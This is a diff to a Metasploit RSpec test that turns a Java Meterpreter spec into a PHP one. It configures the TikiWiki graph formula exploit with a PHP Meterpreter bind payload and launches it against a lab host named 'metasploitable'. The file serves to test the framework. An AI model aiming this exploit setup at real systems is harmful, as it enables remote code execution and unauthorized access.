@@ -9,7 +9,7 @@ require 'meterpreter_specs'
 
 module MsfTest
 
-describe "JavaMeterpreter" do
+describe "PhpMeterpreter" do
 	
 	# This include brings in all the spec helper methods
 	include MsfTest::MeterpreterSpecHelper
@@ -17,15 +17,11 @@ describe "JavaMeterpreter" do
 	# This include brings in all the specs that are generic across the 
 	# meterpreter platforms
 	include MsfTest::MeterpreterSpecs
-	
-	# This include brings in all the specs that are specific to the java
-	# meterpreter
-	include MsfTest::JavaMeterpreterSpecs
 
 	before :all do
 		@verbose = true
 	
-		@meterpreter_type = "java"
+		@meterpreter_type = "php"
 		
 		## Set up an outupt directory
 		@output_directory = "test_output_#{@meterpreter_type}"
@@ -37,7 +33,7 @@ describe "JavaMeterpreter" do
 		Dir.mkdir(@output_directory)
 		@default_file = "#{@output_directory}/default"
 
-		create_session_java
+		create_session_php
 	end
 
 	before :each do
@@ -49,22 +45,18 @@ describe "JavaMeterpreter" do
 	end
 	
 	after :all do
-		FileUtils.rm_rf("*.jpeg")		
-		FileUtils.rm_rf("payload.jar")		
-		FileUtils.rm_rf(@output_directory)
+		#FileUtils.rm_rf("*.jpeg")		
+		#FileUtils.rm_rf(@output_directory)
 	end
 
 	
-	def create_session_java
+	def create_session_php
 
-		## Setup for win32
+		## Setup for php
 		@framework    = Msf::Simple::Framework.create
 		
-		test_modules_path = File.join(File.dirname(__FILE__), '..', '..', 'modules')
-		@framework.modules.add_module_path(test_modules_path)
-		
-		@exploit_name = 'test/java_tester'
-		@payload_name = 'java/meterpreter/bind_tcp'
+		@exploit_name = 'unix/webapp/tikiwiki_graph_formula_exec'
+		@payload_name = 'php/meterpreter/bind_tcp'
 		@input        = Rex::Ui::Text::Input::Stdio.new 
 		@output       = Rex::Ui::Text::Output::File.new(@default_file)
 
@@ -73,7 +65,7 @@ describe "JavaMeterpreter" do
 
 		## Fire it off against a known-vulnerable host
 		@session = exploit.exploit_simple(
-			'Options'     => {},
+			'Options'     => {'RHOST' => "metasploitable"},
 			'Payload'     => @payload_name,
 			'LocalInput'  => @input,
 			'LocalOutput' => @output)
